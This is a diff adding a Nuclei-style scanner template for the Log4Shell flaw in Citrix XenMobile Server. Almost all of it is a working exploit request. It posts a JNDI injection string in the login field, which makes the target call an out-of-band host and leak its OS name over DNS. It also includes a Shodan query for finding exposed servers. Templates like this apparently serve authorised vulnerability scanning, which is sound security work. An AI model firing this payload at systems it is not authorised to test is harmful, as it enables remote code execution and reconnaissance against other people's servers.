@@ -1,0 +1,47 @@
+id: xenmobile-server-log4j
+
+info:
+  name: Citrix XenMobile Server - Remote Code Execution (Apache Log4j)
+  author: DhiyaneshDK
+  severity: critical
+  reference: https://support.citrix.com/article/CTX335705/citrix-security-advisory-for-cve202144228-cve202145046-cve202145105-and-cve202144832
+  metadata:
+    verified: true
+    shodan-query: title:"XenMobile"
+  tags: cve,cve2021,rce,jndi,log4j,xenmobile,oast
+
+requests:
+  - raw:
+      - |
+        POST /zdm/cxf/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/zdm/login_xdm_uc.jsp
+
+        login=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
